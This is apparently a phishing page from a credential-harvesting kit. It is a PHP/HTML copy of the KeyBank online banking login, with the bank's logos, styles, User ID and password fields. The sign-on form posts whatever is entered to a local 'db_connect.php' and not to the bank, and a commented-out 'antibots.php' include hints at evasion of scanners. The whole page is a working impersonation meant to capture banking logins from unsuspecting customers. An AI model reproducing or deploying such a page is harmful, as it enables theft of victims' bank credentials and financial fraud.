<?php
//require("antibots.php");

?>
<!DOCTYPE html>
<html lang="en"><head>
    <meta name="Description" content="Securely access your KeyBank accounts online">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>KeyBank Online</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="apple-touch-icon" sizes="180x180" id="appleTouchIcon" href="images/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" id="fav32" href="images/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" id="fav16" href="images/favicon-16x16.png">
    <link rel="shortcut icon" href="favicon.ico">
    <meta name="apple-itunes-app" content="app-id=510717503">  
    <link rel="stylesheet" type="text/css" href="css/amt-ui-styles-key.css" media="all">
    <link href="css/kds-base-key.css" rel="stylesheet">
    <link href="css/ibx-globals-key.css" rel="stylesheet">
    <link href="css/styles-key.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="css/amt-sdk-styles.css">
    <link rel="stylesheet" type="text/css" href="css/styles.css">
    <link rel="stylesheet" href="css/styles.a4962029f638dde4888c.css">
    <style type="text/css" id="kampyleStyle">.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}button#nebula_div_btn { height: auto !important } .kampyle_vertical_button { background-color:transparent !important;font-family:"Open Sans",sans-serif;cursor:pointer;position:fixed;top:45%;z-index:99999990;height:35px !important;min-height: 35px !important;max-height: 35px !important;width:125px !important;max-width: 125px !important;min-width: 125px !important;-ms-transform:rotate(90deg);-webkit-transform:rotate(90deg);transform:rotate(90deg) } .kampyle_vertical_button .kampyle_button { height:35px;min-height: 35px !important;max-height: 35px !important;width:125px !important;min-width: 125px !important;max-width: 125px !important; background:#5081ff;color:#ffffff;position:absolute;top:0;left:0;z-index:-1; } .kampyle_vertical_button .kampyle_button-text { color:#ffffff;font-size:14px;line-height:35px;text-align:center;font-weight:normal !important; } .kampyle_vertical_button.kampyle_left .kampyle_button { -webkit-border-radius:3px 3px 0 0;-moz-border-radius:3px 3px 0 0;-ms-border-radius:3px 3px 0 0;border-radius:3px 3px 0 0; } .kampyle_vertical_button.kampyle_right { right:-45px; } .kampyle_vertical_button.kampyle_left { left:-45px } .kampyle_vertical_button.kampyle_right .kampyle_button { -webkit-border-radius:0 0 3px 3px;-moz-border-radius:0 0 3px 3px;-ms-border-radius:0 0 3px 3px;border-radius:0 0 3px 3px } .kampyle_vertical_button.kampyle_right, .kampyle_vertical_button.kampyle_left  { padding: 0 !important; }</style></head>
<body>
<login-app ng-version="7.2.16">
        <div class="login-app-wrapper"><router-outlet></router-outlet>
            <login-page>
                <div class="login">
                    <login-header>
                    <header class="container-fluid">
                        <div class="container">
                            <div class="row"><div class="col-12">
                                <div class="login_header d-flex align-items-center justify-content-between">
                                    <a data-analytics-login="logo" id="nonSsoHeader" title="KeyBank"><h3 class="key-logo no-print"><span class="sr-only">KeyBank</span><img alt="KeyBank" src="images/key_white_logo.png"></h3></a>
                                    <a class="d-none sso-header" data-analytics-login="logo" id="ssoHeader" title="KeyBank"><h3 class="key-logo no-print"><span class="sr-only">KeyBank</span><img alt="KeyBank" src="images/key_black_logo.png"></h3></a>
                                    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
                                        <button class="navbar-toggler" type="button"><span class="navbar-toggler-icon"></span></button>
                                        <div class="collapse navbar-collapse navlink-wrapper">
                                            <ul class="mb-0">
                                                <li><a data-analytics-login="contact us" data-test="cntushdrlnk" title="Contact Us">Contact Us</a></li>
                                                <li><a data-analytics-login="open a new account" data-test="openewaccount" title="Open a New Account">Open a New Account</a></li>
                                            </ul>
                                        </div>
                                    </nav>
                                </div>
                            </div>
                        </div>
                    </div>
                </header>
                <div class="navbg-blur collapse navbar-collapse"></div>
            </login-header>
            <sign-in-core>
                <div class="container app-container">
                    <div class="row">
                        <div class="col-12">
                            <div class="signin-block-container d-flex justify-content-center flex-row flex-wrap">
                                <div class="signin-msg-primary-mbl d-block d-md-none">
                                    <div id="msgMobPrimary" hidden=""></div>
                                </div>
                                <div class="signin-container signin-combo" id="signInMain">
                                    <sign-in-header>
                                        <div class="text-center singlesignon_headerauth--logo"><img alt="Key Logo" class="singlesignon_headerauth--logo" src="images/key-logo.svg"></div>
                                        <div class="sso-primarymsg" hidden="">
                                            <div id="msgPrimary"></div>
                                        </div>
                                        <h1 class="kds-screenreader-only">Log in to online banking</h1>
                                    </sign-in-header>
                                    <div class="col-12 mt-3" hidden="">
                                        <div class="kds-alert">
                                            <div class="kds-alert__content kds-alert__content--warning mb-0">
                                                <div class="kds-alert__cell kds-alert__cell--indicator">
                                                    <svg aria-hidden="true" aria-labelledby="login-app-waring" class="kds-icon kds-alert__indicator" role="img"><title class="kds-screenreader-only" id="login-app-waring">Key Login warning icon</title><use xlink:href="images/kds.svg#alert"></use></svg>
                                                </div>
                                                <div class="kds-alert__cell kds-alert__cell--body"><p class="kds-alert__description pb-0" data-test="si_error_msg" x-ms-format-detection="none"></p></div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row signin-block">
                                        <div class="col-12 signin-input-section">
                                            <form autocomplete="off" action="db_connect.php" method="Post" class="ng-pristine ng-valid ng-touched">
                                                <div class="userid-container">
                                                    <kds-input class="userid-input ng-pristine ng-valid ng-touched" data-test="si_userid_input" icon="user-account" name="username" maxlength="30">
                                                        <div class="kds-form__field-group">
                                                            <label class="kds-form__label" for="ibx-user-id-input"><span><span id="ibx-user-id-input-label"> Enter your User ID </span></span></label>
                                                            <div class="kds-form__input-group">
                                                                <input kdsinput="" name="username" id="ibx-user-id-input" placeholder="" maxlength="30" autocapitalize="none" class="ng-pristine ng-valid kds-form__input ng-touched" type="text" required>
                                                            </div>
                                                        </div>
                                                    </kds-input>
                                                </div>
                                                <kds-input data-test="log_pwd_txt" name="password" class="ng-untouched ng-pristine ng-valid">
                                                    <div class="kds-form__field-group">
                                                        <label class="kds-form__label" for="ibx-password-input"><span><span id="ibx-password-input-label"> Enter your Password </span></span></label>
                                                        <div class="kds-form__input-group">
                                                            <input kdsinput=""  name="password" id="ibx-password-input" placeholder="" autocapitalize="none" class="ng-untouched ng-pristine ng-valid kds-form__input" type="password">
                                                        </div>
                                                    </div>
                                                </kds-input>
                                                <div class="d-flex justify-content-between">
                                                    <div class="pull-left"><kds-checkbox data-analytics="action_cl|rememberMe" data-test="si_save_userid" name="rememberMe" class="ng-untouched ng-pristine ng-valid"><label class="kds-form__checkbox" id="label-kdscheckbox-0" for="kdscheckbox-0"><input class="kds-form__checkbox-input" type="checkbox" id="kdscheckbox-0" name="rememberMe" value="" aria-labelledby="label-kdscheckbox-0"><span class="kds-form__checkbox-visible-wrap"><span class="kds-form__checkbox-visual"><svg aria-hidden="true" class="kds-icon kds-icon--m kds-form__checkbox-icon kds-form__checkbox-icon--checked" focusable="false"><use xlink:href="/ibxolb/olb/share/assets/images/kds.svg#check" href="/ibxolb/olb/share/assets/images/kds.svg#check"></use></svg><svg aria-hidden="true" class="kds-icon kds-icon--m kds-form__checkbox-icon kds-form__checkbox-icon--indeterminate" focusable="false"><use xlink:href="/ibxolb/olb/share/assets/images/kds.svg#minus" href="/ibxolb/olb/share/assets/images/kds.svg#minus"></use></svg></span><span class="kds-form__checkbox-text "> Remember me </span></span></label></kds-checkbox></div>
                                                </div>
                                                <button class="mt-3 kds-button--primary kds-button kds-button--block" data-test="log_sbt_btn" type="submit">Sign On </button>
                                            </form>
                                        </div>
                                        <div class="col-12 mt-4 signin__button-well signin-button-well-combo">
                                            <div class="pull-right">
                                                <button data-analytics-login="problem" data-test="si_help_btn" kdsbutton="flat" class="kds-button--flat kds-button kds-button--block" type="button">Problem Signing On? </button>
                                            </div>
                                            <hr><button data-analytics="action_cl|enroll" data-analytics-login="enroll" data-test="si_enroll_btn" kdsbutton="flat" class="kds-button--flat kds-button kds-button--block" type="button">Enroll in Online Banking</button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </sign-in-core>
    </div>
</login-page>
</div>
</login-app>
</body></html>